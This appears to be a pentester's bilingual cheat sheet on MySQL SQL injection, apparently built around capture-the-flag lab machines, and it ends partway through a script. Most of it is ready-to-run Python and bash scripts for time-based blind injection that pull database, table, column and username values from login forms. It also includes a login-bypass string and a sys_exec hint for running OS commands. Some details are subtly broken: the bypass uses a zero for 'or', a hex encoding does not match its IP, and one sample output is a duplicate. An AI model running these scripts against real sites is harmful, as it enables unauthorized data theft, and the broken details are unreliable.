
# SQL Injection


<mark style="color:yellow">**IMPORTANT**</mark>  
Consider encoding in URL format (**urlencode**) the requests  
><p style="font-size:11px"><span style="font-weight:bold">Request:</span> sql CREATE FUNCTION sys_exec RETURNS int SONAME customlib.so</p>
><p style="font-size:11px"><span style="font-weight:bold">URLencoded:</span> sql CREATE%20FUNCTION%20sys_exec%20RETURNS%20int%20SONAME%20%27customlib.so%27</p>
  
Consider **encoding in hexadecimal** (xxd -p [ | tr -d 'd' ]) the **values** that are passed **in function calls**  
><p style="font-size:11px"><span style="font-weight:bold">Request:</span> sql SELECT sys_exec('ping -c 2 192.168.49.204')</p>
><p style="font-size:11px"><span style="font-weight:bold">Hexadecimal encoding:</span> sql SELECT sys_exec(0x70696e67202d6332203139322e3136382e3439392e323034)</p>


## Resources

##### MySQL Manuals (available functions x versions):  
>https://dev.mysql.com/doc/refman/5.7/en/information-functions.html  

##### SQLi Cheat Sheets  
>https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet  
>https://book.hacktricks.xyz/pentesting-web/sql-injection/mysql-injection/mysql-ssrf  


## Interesting Information  

##### Comparison of Case-Sensitive Strings  

```
cast('<character>') as binary = cast('<character>') as binary
```  

## Exploit Vector  
A field where a value is entered that performs a query to a DB on the server.
For example a login form  


## Magic Statement  
In a login form, if the query is poorly constructed, this statement entered in the user field, the password field, or both, can provide access with the first user.  
```sql
' 0r 1=1-- -
```

## 'Error Based' Type Injections  
<p style="font-size:11px">
	<mark style="color:yellow;font-weight:bold;">Note:</mark> All the examples below are based on a scenario with a <mark style="color:orange">database</mark> named '<mark style="color:yellow">College</mark>', containing a <mark style="color:orange">table</mark> named '<mark style="color:yellow">Students</mark>', composed of three <mark style="color:orange">columns</mark> (<mark style="color:yellow">id</mark>, <mark style="color:yellow">username</mark> and <mark style="color:yellow">password</mark), in which we have entered a <mark style="color:orange">record</mark> with the values (<mark style="color:yellow">1</mark>, <mark style="color:yellow">d1ch0t0my</mark>, <mark style="color:yellow">d1ch0123</mark>).
</p>

### Quick Test  

```sql
' order by 100-- -
```

### Description	 
If when entering in the injectable field \"<mark style="color:green">' order by 100-- -</mark>"  
It returns an error of the type "<mark style="color:blue">Unknown column '100'...</mark>"  
It can mean that we are in front of an '**Error Based**' type injection.  
Since the response is telling us that it does not know the column 100, which means that it IS processing our request.  
We can take advantage of this as a way of executing SQL statements to obtain information, etc.  

### Exploitation
We can reduce the number of columns until we do NOT get this error, which will tell us the total number of columns that the database has:  
<mark style="color:green">' order by 3-- -</mark>
Once we have found out the total number of columns, we will use the instruction '<mark style="color:grey">union select</mark>' to select all the columns and to list them:  
<mark style="color:green">' union select 1,2,3-- - -</mark>
This should return a "label" for each column with the number we have entered, of the type:

~~~
+----+-----------+----------+
| id | username  | password |
+----+-----------+----------+
|  1 | d1ch0t0my | d1ch0123 |
|  1 | 2         | 3        |
+----+-----------+----------+
1 rows in set (0.000 sec)
~~~

With this we can replace one of the "tags" with commands that return information from the database.  
Some examples would be:  

Get the name of the database in use  
<mark style="color:green">' union select 1,2,database()-- -</mark>

~~~
+----+-----------+----------+
| id | username  | password |
+----+-----------+----------+
|  1 | d1ch0t0my | d1ch0123 |
|  1 | 2         | Colegio  |
+----+-----------+----------+
1 rows in set (0.000 sec)
~~~

Get the user who is running the database  
<mark style="color:green">' union select 1,2,user()-- -</mark>

~~~
+----+-----------+-----------------+
| id | username  | password        |
+----+-----------+-----------------+
|  1 | d1ch0t0my | d1ch0123        |
|  1 | 2         | root@localhost  |
+----+-----------+-----------------+
1 rows in set (0.000 sec)
~~~

List all tables in the database
<mark style="color:green">' union select 1,2,table_name from information_schema.tables-- -</mark>

~~~
+----+-----------+----------+
| id | username  | password |
+----+-----------+----------+
|  1 | d1ch0t0my | d1ch0123 |
|  1 | 2         | Colegio  |
+----+-----------+----------+
1 rows in set (0.000 sec)
~~~

<p style="font-size:11px">
	<mark style="color:yellow">Note</mark>: you can limit the list, to list them one by one, adding them at the end of the query "<mark style="color:orange">limit n</mark>"  
	e.g:  
	<mark style="color:yellow">'' union select 1,2,table_name from information_schema.tables limit 1,1-- -</mark>  ← would list the first table.  
	<mark style="color:yellow">' union select 1,2,table_name from information_schema.tables limit 2,1-- -</mark> ← would list the second table  
	etc.  
</p>


## Blind SQL injection Time Based

<p style="font-size:11px">
	<mark style="color:yellow;font-weight:bold;">Note:</mark> All the examples below are based on a scenario with a <mark style="color:orange">database</mark> named '<mark style="color:yellow">College</mark>', containing a <mark style="color:orange">table</mark> named '<mark style="color:yellow">Students</mark>', composed of three <mark style="color:orange">columns</mark> (<mark style="color:yellow">id</mark>, <mark style="color:yellow">username</mark> and <mark style="color:yellow">password</mark), in which we have entered a <mark style="color:orange">record</mark> with the values (<mark style="color:yellow">1</mark>, <mark style="color:yellow">d1ch0t0my</mark>, <mark style="color:yellow">d1ch0123</mark>).
</p>

Quick Tests
In the user field of a login or after any variable that we consider vulnerable:
UnUserAny ' or if(1=1, sleep(5),1)-- - ← If SQL injection exists it will wait 5 seconds.
AValidUser ' and sleep(5)-- - ← If the user is correct (exists), and we have SQL injection, it will wait 5 seconds.


Descripción
Cuando no podemos ver la respuesta de error del lado del servidor, podemos utilizar la instrucción 'sleep(n)' para verificar si existe la inyección en base al tiempo de respuesta.
Concatenamos la instrucción que queremos verificar con un 'sleep' mediante un condicional 'if', de forma que, si la instrucción es cierta, esperará los segundos que le indiquemos en el sleep.

Determinar la Versión del DBMS
Se puede verificar la versión del DBMS comprobando que función de "demora" tenemos disponibles.

MySQL
Versión <		5.0.12	disponible la función	BENCHMARK()
Versión >= 	5.0.12 	disponible la función	SLEEP()

PostgreSQL
Versión < 	8.2	disponible la función	generate_series() ← NOTA: Si es el caso, se puede crear una función SLEEP() personalizada desde la librería system built-in libc del OS
Versión >= 	8.2	disponible la función	PG_SLEEP()

Microsoft SQL Server
Función de demora: WAITFOR DELAY '0:0:5'


Ejemplo
Si queremos averiguar el nombre de una base de datos (podría ser una tabla, etc.) podemos hacer consultas a la BBDD del tipo "el caracter número 'n' del string que contine el nombre de la BBDD, ¿es una 'a'?" y concatenarlas con un condicional del tipo "si es así espera '5' segundos".
Si la ejecución tarda 5 segundos, o más (puede haber algo de variación, siempre por encima de 5 segundos), sabremos que efectivamente el caracter 'n' del nombre es una 'a'.
La sintaxis de este tipo de consultas en SQL, para el nombre de la base de datos, sería:
select username,password from Alumnos where id = 1 and if(substr(database(),1,1)='a',sleep(5),1);-- -;
Donde:
select usename, password from Alumnos where id = 1 → seleciona los campos username y password de la tabla Alumnos, de la base de datos en uso, cuyo id sea 1
and 			→ es el operador boleano para añadir una instrucción a continuación
'if' 			→ es el operador condicional para indicar "si se cumple la condición que le sigue entre paréntesis haz tal cosa"
substr 		→ obtiene el valor de el caracter 'n' de una cadena str, con una sintaxis como substr(str,n,1), en este caso el primer caracter de la cadena que se obtiene al ejecutar el comando "database()" que a su vez lo que hace es obtener el nombre de la base de datos en uso
='a' 			→ iguala a 'a' la obtención del caracter obtenido por substr
sleep(5)	→ indica que espere 5 segundo antes de continuar la ejecución


Automatización
Crearemos un script en python para realizar las consultas al servidor de forma automatizada.
El script enviará las peticiones para chequear los caracteres que componen el string que forma el nombre que queremos averiguar de uno a uno (la longitud de nombre estará predefinida) con todo el abcedario y los números del 0 al 9.
Si la respuesta tarda más de la una cantidad de segundos, predefinida por nosotros, significará que el caracter consultado es correcto (case insensitive) y lo añadirá a una cadena 'result' que será la que se imprimirá como resultado final.

Averiguar Nombre de Base de Datos
La consulta sería: substr(database(),%d,1)='%c',sleep(5),1)
Donde:
database() → es la instrucción SQL que devuelve un string con el nombre de la BBDD en uso
%d → será la posición del caracter que se está comprobando
%c → será la posición en el array de caracteres a probar del caracter que se comprueba
5 → será el número de segundos de espera antes de proseguir con la ejecución (si lo espera es que coincide)

sqli_pwner_POST.py

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests, time, sys, signal
from pwn import *

# Función para controlar la salida del programa al hacer Ctrl+C
def def_handler(sig, frame):
log.failure("Saliendo")
sys.exit(1)

# Definición de la función a utilizar al producirse una señal de Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# variable para almacenar la URL vícitma
url = 'http://admin.cronos.htb/index.php'

# variable para tunelizar las consultas con BurpSuite
burp = {'http': 'http://127.0.0.1:8080'}

# variable que almacena los caracteres que se probaran
s = r'0123456789abcdefghijklmnopqrstuvwxyz.:*@#$%^&-_=()!¡\/{}[]'
# variable para almacenar los resultados
result = ''

# función para comprobar el tiempo que tarda el servidor en responder
def check(payload):
# variable que almacena el formato de la data para las peticiones
data_post = {
# los valores se obtienen analizando una consulta hecho con Burp se pasará un valor
# stático de 'test' para la password y se meterá el valor del payload (que se le
# pasará como argumento a la función) como valor de username
'username': '%s' % payload,
'password': 'test'
}

# variable que almacena el valor del tiempo actual
time_start = time.time()
# variable que almacena el contenido que se enviará como petición
# se pasa el valor definido en la variable url y la data definida
# en la variable data_post
content = requests.post(url, data=data_post)
# variable que almacena el valor del tiempo al finalizar la petición
time_end = time.time()
# verificación del si la diferencia entre el tiempo inicial y el final es mayor de 5 segundos
if time_end - time_start > 5:
return 1

# variable para almacenar el progreso
p1 = log.progress("Database")
p2 = log.progress("Payload")

# primer bucle que recorre cada uno de los caracteres del nombre
# con un tamaño predefinido de 10
for i in xrange(1, 10):
# bucle anidado que recorre cada uno de los caracteres almacenados
# en la variable s
for c in s:
# variable que almacenará la sentencia a inyectar
# en este caso usaremos un "' or " para que se ejecute cuando la primera instrucción falle
# comprobará si el caracter %d de la cadena del nombre de la bbdd database() coincide con
# el caracter %c y si coincide esperará 5 segundo. Siendo %d=i y %c=c
payload = "' or if(substr(database(),%d,1)='%c',sleep(5),1)-- -" % (i,c)
# visualizamos el progreso de la generación del payload
p2.status("%s" % payload)
# verificamos si el retorno de la función check es 1, que significaría que ha tardado más de 5 segundos
if check(payload):
# añadimos el caracter a la variable result
result += c
# visualizamos el progeso de la generación del resultado
p1.status("%s" % result)
break

# imprimimos el resultado final
log.info("Database: %s" % result)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

sqli_CURL.sh

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#!/bin/bash

echo

# variable que almacena los caracteres que se probaran
char='0123456789abcdefghijklmnopqrstuvwxyz.:*@#$%^&-_=()!¡\/{}[]'

# variable para almacenar los resultados
result=""
whitechar=0

# primer bucle que recorre cada uno de los caracteres del nombre con un tamaño predefinido de 10
for i in {1..10}
do
# bucle anidado que recorre cada uno de los caracteres almacenados en la variable char
for (( k=0; k<${#char}; k++ ))
do
echo -e "\e[1A\e[KProbando caracter ${char:$k:1} en posición $result""_"

SECONDS=0
curl -X POST "http://192.168.169.52/zm/index.php" \
-d "view=request&request=log&task=query&limit=100;( SELECT * FROM ( SELECT( if( \
substr(database(),$i,1)='${char:$k:1}',sleep(5),1) ) \
)OQkj)#minTime=1466674406.084434'" &>/dev/null
DURATION=$SECONDS        


# verificación del si la diferencia entre el tiempo inicial y el final es mayor de 5 segundos
if [[ "$DURATION" -ge "4" ]]
then
result+=${char:$k:1}
if [[ "$i" -eq "1" ]]
then
echo -e "\e[1A\e[KEncontrado nuevo caracter: $result\n"
whitechar=0
else
echo -e "\e[2A\e[KEncontrado nuevo caracter: $result\n"
whitechar=0
fi
break
else
if [[ "${char:$k:1}" = "z" ]]
then
whitechar=$((whitechar+1))
if [[ "whitechar" -eq "2" ]]
then
echo -e "\nSegundo caracter en blanco"
echo -e "Fin del programa"
echo -e "\nDatabase: $result"
exit
fi
fi

fi
done
done
# imprimimos el resultado final
echo "Database: $result"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


sqli_pwner_GET.py

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests, time, sys, signal
# from pwn import *

# Función para controlar la salida del programa al hacer Ctrl+C
def def_handler(sig, frame):
log.failure("Saliendo")
sys.exit(1)

# Definición de la función a utilizar al producirse una señal de Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# variable para almacenar la URL vícitma
url = 'http://127.0.0.1:1234/index.php'

# variable para tunelizar las consultas con BurpSuite
burp = {'http': 'http://127.0.0.1:8080'}

# variable que almacena los caracteres que se probaran
s = r'0123456789abcdefghijklmnopqrstuvwxyz.:*@#$%^&-_=()!¡\/{}[]'
# variable para almacenar los resultados
result = ''

# función para comprobar el tiempo que tarda el servidor en responder
def check(payload):
# variable que almacena la url final de la petición
req = "%s?method=select&username=administrator%s&table=passwords" % (url, payload)

# variable que almacena el valor del tiempo actual
time_start = time.time()
# variable que almacenará la respuesta de la petición GET
content = requests.get(req)
# variable que almacena el valor del tiempo al finalizar la petición
time_end = time.time()
# verificación del si la diferencia entre el tiempo inicial y el final es mayor de 5 segundos
if time_end - time_start > 5:
return 1

print("\n[*] Iniciando fuerza bruta\n")

# primer bucle que recorre cada uno de los caracteres del nombre
# con un tamaño predefinido de 10
for i in xrange(1, 10):
# bucle anidado que recorre cada uno de los caracteres almacenados
# en la variable s
for c in s:
# variable que almacenará la sentencia a inyectar
# en este caso usaremos un "' and " para que se ejecute cuando la primera instrucción falle
# comprobará si el caracter %d de la cadena del nombre de la bbdd database() coincide con
# el caracter %c y si coincide esperará 5 segundo. Siendo %d=i y %c=c
payload = "'+and+if(substr(database(),%d,1)='%c',sleep(5),1)--+-" % (i,c)
# verificamos si el retorno de la función check es 1, que significaría que ha tardado más de 5 segundos
if check(payload):
# añadimos el caracter a la variable result
result += c
sys.stdout.write('\r'+'Resultado: '+str(result))
sys.stdout.flush()
# print(result)
break
print("\n\n[*] Ejecución finalizada!")

# imprimimos el resultado final
# log.info("Database: %s" % result)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



Averiguar Tablas de Base de Datos Conocida
La consulta sería:
substr((select table_name from information_schema.tables where table_schema='BBDD_Name' limit %d,1),%d,1)='%c',sleep(5),1
Donde:
BBDD_Name → es el nombre de la BBDD que contiene la/s tabla/s de la/s cual/es queremos averiguar el nombre
%d → indicará el número de tablas de las que buscar el nombre (para poner un límite de tablas, por si hay muchas)
%d → será la posición del caracter que se está comprobando
%c → será la posición en el array de caracteres a probar del caracter que se comprueba
5 → será el número de segundos de espera antes de proseguir con la ejecución (si lo espera es que coincide)
sqli_pwner.py

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests, time, sys, signal
from pwn import *

def def_handler(sig, frame):
log.failure("Saliendo")
sys.exit(1)

signal.signal(signal.SIGINT, def_handler)
url = 'http://admin.cronos.htb/index.php'
burp = {'http': 'http://127.0.0.1:8080'}
s = r'0123456789abcdefghijklmnopqrstuvwxyz.:*@#$%^&-_=()!¡\/{}[]'
result = ''

def check(payload):
data_post = {
'username': '%s' % payload,
'password': 'test'
}
time_start = time.time()
content = requests.post(url, data=data_post)
time_end = time.time()
if time_end - time_start > 5:
return 1

p2 = log.progress("Payload")

for j in xrange (0, 3):
p1 = log.progress("Tabla [%d]" % j)
# variable para controlar los espacios en blanco
cont = 0
for i in xrange(1, 10):
# Si ha sumado mas de 2 veces sin encontrar un caracter, se entiende que son caracteres en blanco, se da por finalizada la búsqueda para esa columna
if ( cont > 2 ):
break

for c in s:
payload = "' or if(substr((select table_name from information_schema.tables where table_schema='admin' limit %d,1),%d,1)='%c',sleep(5),1)-- -" % (j,i,c)
p2.status("%s" % payload)
if check(payload):
result += c
p1.status("%s" % result)
# si ha encontrado una coincidencia resetea el contador de caracteres en blanco para permitir espacios entre las palabras que formen el nombre
cont = 0
break

# si ha llegado a recorrer todos los caracteres significa que no ha encontrado ninguna coincidencia, se suma 1 a caracteres en blanco
cont += 1

p1.success("%s" % result)
# Borra el contenido de la variable result para comernzar con la siguiente tabla
result = ''
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

sqli_db_tables.sh

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#!/bin/bash

# DEFINICION DE COLORES PARA USAR EN SCRIPTS DE BASH
def='\e[39m'
red='\e[38;5;196m'
green='\e[38;5;46m'
yellow='\e[38;5;11m'
blue='\e[38;5;21m'
pink='\e[38;5;13m'
cian='\e[38;5;87m'
white='\e[38;5;15m'
grey='\e[38;5;240m'

# CAPTURAR Ctrl+C
trap ctrl_c INT

function ctrl_c(){
echo -e "\n[${yellow}!${def}] Detectado Ctrl+C"
echo -e "[${red}*${def}] Finalizando la ejecución..."
tput cnorm
exit 0
}

tput civis
echo

# ADAPTAR ESTOS VALORES
host='192.168.102.52'
tablelimit=100
charlimit=100

# variable que almacena los caracteres que se probaran
char='0123456789abcdefghijklmnopqrstuvwxyz.:*@#$%^&-_=()!¡\/{}[]'

# nombre de la Base de Datos conocida
bbdd="zm"

# variable para almacenar los resultados
result=""
whitechar=0
whitetable=0

for (( t=0; t<=$tablelimit; t++)) # limite de tablas
do
if [[ "whitetable" -ge "2" ]]
then
echo -e "[${yellow}¡${def}] Segunda tabla en blanco"
echo -e "[${green}*${def}] Fin de enumeración de TABLAS"
tput cnorm
exit 0
fi
echo -e "${white}Enumerando tabla ${cian}$t${def}\n"
for (( i=0; i<=$charlimit; i++))
do
if [[ "whitechar" -ge "2" ]]
then
echo -e "  \e[1A\e[K[${grey}-${def}] Segundo caracter en blanco"
echo -e "  Fin de enumeración de la tabla $t\n"
echo -e "  ${white}Tabla: ${green}$result${def}\n\n"
chrlen=${#result}
if [[ "$chrlen" -le 1 ]]
then
whitetable=$((whitetable + 1))
fi
break
fi

# bucle anidado que recorre cada uno de los caracteres almacenados en la variable char
for (( k=0; k<${#char}; k++ ))
do
echo -e "  \e[1A\e[KProbando caracter ${char:$k:1} en posición $i: $result""_"

SECONDS=0
curl -X POST "http://$host/zm/index.php" \
-d "view=request&request=log&task=query&limit=100;( SELECT * FROM ( SELECT( if( \
substr((select table_name from information_schema.tables where table_schema='zm' limit $t,1),$i,1)='${char:$k:1}',sleep(5),1 \
) ) )OQkj)#minTime=1'" &>/dev/null

DURATION=$SECONDS        


# verificación del si la diferencia entre el tiempo inicial y el final es mayor de 5 segundos
if [[ "$DURATION" -ge "4" ]]
then
result+=${char:$k:1}
if [[ "$i" -eq "1" ]]
then
echo -e "  \e[1A\e[KCaracteres encontrados: $result\n"
whitechar=0
break
else
echo -e "  \e[2A\e[KCaracteres encontrados: $result\n"
whitechar=0
break
fi
else
if [[ "${char:$k:1}" = "z" ]]
then
whitechar=$((whitechar+1))
fi
fi
done
done
if [[ "whitechar" -ge "2" ]]
then
whitechar=0
result=""
else
echo -e "  Se ha alcanzado el límite de 15 caracteres por tabla. Fin de enumeración de la tabla $t"
echo -e "\n  ${white}Tabla: $result\n\n"
whitechar=0
result=""
fi
done
echo -e "[${green}*${def}]Fin de enumeración de tablas"
tput cnorm
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Señalar que en este caso se pone la sentencia entre paréntesis, para que no de errores en la ejecución.
Se añade un contador de espacios en blanco (para aligerar la búsqueda).
En el primer caracter que no encuentre coincidencia continuará, para permitir nombres compuestos, con dos o más palabras
La segunda vez, consecutiva, que no encuentra coincidencia, entiende que son 2 espacios en blanco seguidos y entiende que ha finalizado la búsqueda.


Averiguar Columnas de Tabla Conocida
La consulta sería: substr((select column_name from information_schema.columns where table_name='Table_Name' limit %d,1),%d,1)='%c',sleep(5),1
Donde:
Table_Name → es el nombre de la tabla de la que queremos obtener las columnas
%d → indicará el número de columnas que queremos buscar (para poner un límite, por si hay muchas)
%d → será la posición del caracter que se está comprobando
%c → será la posición en el array de caracteres a probar del caracter que se comprueba
5 → será el número de segundos de espera antes de proseguir con la ejecución (si lo espera es que coincide)

¡¡ OJO !!! → Los Nombres de las Tablas SON CASE SENSITIVE ← probar con la primera mayúscula y el resto minúsculas
sqli_pwner.py

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests, time, sys, signal
from pwn import *

def def_handler(sig, frame):
log.failure("Saliendo")
sys.exit(1)

signal.signal(signal.SIGINT, def_handler)
url = 'http://admin.cronos.htb/index.php'
burp = {'http': 'http://127.0.0.1:8080'}
s = r'0123456789abcdefghijklmnopqrstuvwxyz.:*@#$%^&-_=()!¡\/{}[]'
result = ''

def check(payload):
data_post = {
'username': '%s' % payload,
'password': 'test'
}
time_start = time.time()
content = requests.post(url, data=data_post)
time_end = time.time()
if time_end - time_start > 5:
return 1

p2 = log.progress("Payload")

for j in xrange (0, 3):
p1 = log.progress("Tabla [%d]" % j)
for i in xrange(1, 10):
if i >= 4:
if result == '':
break
for c in s:
payload = "' or if(substr((select column_name from information_schema.columns where table_name='users' limit %d,1),%d,1)='%c',sleep(5),1)-- -" % (j,i,c)

p2.status("%s" % payload)
if check(payload):
result += c
p1.status("%s" % result)
break

p1.success("%s" % result)
result = ''
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

¡¡ OJO !!! → Los Nombres de las Tablas SON CASE SENSITIVE ← probar con la primera mayúscula y el resto minúsculas
sqli_db_columns.sh <table_name>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#!/bin/bash

# DEFINICION DE COLORES PARA USAR EN SCRIPTS DE BASH
def='\e[39m'
red='\e[38;5;196m'
green='\e[38;5;46m'
yellow='\e[38;5;11m'
blue='\e[38;5;21m'
pink='\e[38;5;13m'
cian='\e[38;5;87m'
white='\e[38;5;15m'
grey='\e[38;5;240m'

# CAPTURAR Ctrl+C
trap ctrl_c INT


function ctrl_c(){
echo -e "\n[${yellow}!${def}] Detectado Ctrl+C"
echo -e "[${red}*${def}] Finalizando la ejecución..."
tput cnorm
exit 0
}

function usage(){
echo -e "\n${white}[${red}!${white}]${def} ERROR: no se ha proporcionado el nombre de la tabla a enumerar\n"
echo -e "${white}[${def}-${white}]${def} USO:\n\t${white}$0 ${yellow}<nombre_de_tabla>${def}"
echo -e "\t${grey}$0 Users${def}"
echo -e "\n\n${white}[${yellow}!${white}]${def} RECUERDA:\n\t Los ${white}nombres${def} de las ${white}tablas${def} son ${white}CASE SENSITIVE${def}"
echo -e "\tProbar con la primera letra en mayúscula y el resto en minúscula"
exit 0
}

if [[ "$#" -lt 1 ]]
then
usage
fi

tput civis

# ADAPTAR ESTOS VALORES
host='192.168.102.52'
tablename=$1 # pasar el nombre de la tabla a enumerar como argumento 1
tablelimit=100
charlimit=100

# variable que almacena los caracteres que se probaran
char='0123456789abcdefghijklmnopqrstuvwxyz.:*@#$%^&-_=()!¡\/{}[]'

# variable para almacenar los resultados
result=""
whitechar=0
whitecolumn=0

echo -e "\n${white}[${green}*${white}] --- Enumerando COLUMNAS de la tabla ${yellow}$tablename ${white}--- [${green}*${white}]${def}\n"

for (( t=0; t <= $tablelimit; t++)) # limite de COLUMNAS
do
if [[ "whitecolumn" -ge "2" ]]
then
echo -e "[${yellow}¡${def}] Segunda COLUMNA en blanco"
echo -e "[${green}*${def}] Fin de enumeración de COLUMNAS"
tput cnorm
exit 0
fi
echo -e "${white}Enumerando COLUMNA ${cian}$t${def}\n"
for (( i=1; i <= $charlimit; i++))
do
if [[ "whitechar" -ge "2" ]]
then
echo -e "  \e[1A\e[K[${grey}-${def}] Segundo caracter en blanco"
echo -e "  Fin de la enumeración de la COLUMNA $t\n"
echo -e "  ${white}Columna: ${green}$result${def}\n\n"
chrlen=${#result}
if [[ "$chrlen" -le 1 ]]
then
whitecolumn=$((whitecolumn + 1))
fi
break
fi

# bucle anidado que recorre cada uno de los caracteres almacenados en la variable char
for (( k=0; k<${#char}; k++ ))
do
echo -e "  \e[1A\e[KProbando caracter ${char:$k:1} en posición $i: $result""_"

SECONDS=0
curl -X POST "http://$host/zm/index.php" \
-d "view=request&request=log&task=query&limit=100;( SELECT * FROM ( SELECT( if( \
substr((select column_name from information_schema.columns where table_name='$tablename' limit $t,1),$i,1)='${char:$k:1}',sleep(5),1 \
) ) )OQkj)#minTime=1'" &>/dev/null

DURATION=$SECONDS

# verificación del si la diferencia entre el tiempo inicial y el final es mayor de 5 segundos
if [[ "$DURATION" -ge "4" ]]
then
result+=${char:$k:1}
if [[ "$i" -eq "1" ]]
then
echo -e "  \e[1A\e[KCaracteres encontrados: $result\n"
whitechar=0
break
else
echo -e "  \e[2A\e[KCaracteres encontrados: $result\n"
whitechar=0
break
fi
else
if [[ "${char:$k:1}" = "z" ]]
then
whitechar=$((whitechar+1))
fi
fi
done
done
if [[ "whitechar" -ge "2" ]]
then
whitechar=0
result=""
else
echo -e "  Se ha alcanzado el límite de $charlimit caracteres por columna."
echo -e "\n  ${yellow}Columna: $result${def}\n\n"
whitechar=0
result=""
fi
done
echo -e "[${green}*${def}]Fin de enumeración de COLUMNAS"
tput cnorm
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Señalar que en este caso se pone la sentencia entre paréntesis, para que no de errores en la ejecución.
Se añade un contador de espacios en blanco (para aligerar la búsqueda).
En el primer caracter que no encuentre coincidencia continuará, para permitir nombres compuestos, con dos o más palabras
La segunda vez, consecutiva, que no encuentra coincidencia, entiende que son 2 espacios en blanco seguidos y que ha finalizado la búsqueda.


Averiguar Valor de Campo Conocido en Tabla Conocida Basado en Columna ID
La consulta sería: substr((select columnaUserName from tablaUsers where id='%d'),%d,1)='%c',sleep(5),1
Donde:
columnaUserName → es el nombre de la columna que contiene los nombres de usuario
tablaUsers → es el nombre de la tabla que contiene la columna con los nombres de usuario
%d → indicará el número de usuario que queremos identificar (para poner un límite, por si hay muchos)
%d → será la posición del caracter que se está comprobando
%c → será la posición en el array de caracteres a probar del caracter que se comprueba
5 → será el número de segundos de espera antes de proseguir con la ejecución (si lo espera es que coincide)
sqli_pwner.py

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests, time, sys, signal
from pwn import *

def def_handler(sig, frame):
log.failure("Saliendo")
sys.exit(1)

signal.signal(signal.SIGINT, def_handler)
url = 'http://admin.cronos.htb/index.php'
burp = {'http': 'http://127.0.0.1:8080'}
s = r'abcdefghijklmnopqrstuvwxyz0123456789.:*@#$%^&-_=()!¡\/{}[]'
result = ''

def check(payload):
data_post = {
'username': '%s' % payload,
'password': 'test'
}
time_start = time.time()
content = requests.post(url, data=data_post)
time_end = time.time()
if time_end - time_start > 5:
return 1

p2 = log.progress("Payload")

for j in xrange (0, 4):
p1 = log.progress("Usuario[%d]" % j)

# variable para controlar los espacios en blanco
cont = 0

for i in xrange(1, 10):
# Si ha sumado mas de 2 veces sin encontrar un caracter, se entiende que son caracteres en blanco, se da por finalizada la búsqueda para esa columna
if ( cont > 2 ):
break

for c in s:
payload = "' or if(substr((select username from users where id='%d'),%d,1)='%c',sleep(5),1)-- -" % (j,i,c)
p2.status("%s" % payload)

if check(payload):
result += c
p1.status("%s" % result)
# si ha encontrado una coincidencia resetea el contador de caracteres en blanco para permitir espacios entre las palabras que formen el nombre
cont = 0
break

# si ha llegado a recorrer todos los caracteres significa que no ha encontrado ninguna coincidencia, se suma 1 a caracteres en blanco
cont += 1

p1.success("%s" % result)
result = ''
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


sqli_db_field_id.sh <campo> <tabla> [longitud_máxima_del_campo]

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#!/bin/bash

# DEFINICION DE COLORES PARA USAR EN SCRIPTS DE BASH
def='\e[39m'
red='\e[38;5;196m'
green='\e[38;5;46m'
yellow='\e[38;5;11m'
blue='\e[38;5;21m'
pink='\e[38;5;13m'
cian='\e[38;5;87m'
white='\e[38;5;15m'
grey='\e[38;5;240m'

# CAPTURAR Ctrl+C
trap ctrl_c INT


function ctrl_c(){
echo -e "\n[${yellow}!${def}] Detectado Ctrl+C"
echo -e "[${red}*${def}] Finalizando la ejecución..."
tput cnorm
exit 0
}

function usage(){
echo -e "\n${white}[${red}!${white}]${def} Se ha producido uno de los siguientes ERRORES:"
echo -e "\t- No se ha proporcionado el nombre de la tabla a enumerar (como argumento 1)"
echo -e "\t- No se ha proporcionado el nombre del campo a enumerar (como argumento 2)"
echo -e "\t- Se han proporcionado más argumentos de los esperados (máximo 3)\n"
echo -e "${white}[${def}-${white}]${def} USO:\n\t${white}$0 ${yellow} <nombre_de_campo> <nombre_de_tabla> ${grey}[longitud_del_campo]${def}"
echo -e "\t${grey}$0 username Users 20${def}"
echo -e "\n\n${white}[${yellow}!${white}]${def} RECUERDA:\n\tLos ${white}nombres${def} de las ${white}tablas${def} son ${white}CASE SENSITIVE${def}"
echo -e "\tProbar con la primera letra en mayúscula y el resto en minúscula"
exit 0
}

if [[ "$#" -lt "2" ]]
then
usage
fi

if [[ "$#" -gt "3" ]]
then
usage
fi

tput civis

# ADAPTAR ESTOS VALORES
host='192.168.102.52'
fieldname=$1 # pasar el nombre del campo a enumerar como argumento 1
tablename=$2 # pasar el nombre de la tabla a enumerar como argumento 2
resultlimit=100
charlimit=100

# corrección del límite de caracteres en función de si se ha proporcionado uno como argumento 3
if [[ "$#" -eq "3" ]]
then
charlimit=$3
fi

# variable que almacena los caracteres que se probaran
char='0123456789abcdefghijklmnopqrstuvwxyz.:*@#$%^&-_=()!¡\/{}[]'

# variable para almacenar los resultados
result=""
whitechar=0
whiteresult=0

echo -e "\n${white}[${green}*${white}] --- Enumerando campo ${yellow}$fieldname${def} de la tabla ${yellow}$tablename ${white}en base a ID --- [${green}*${white}]${def}\n"
for (( t=0; t <= $resultlimit; t++)) # limite de RESULTADOS a obtener
do
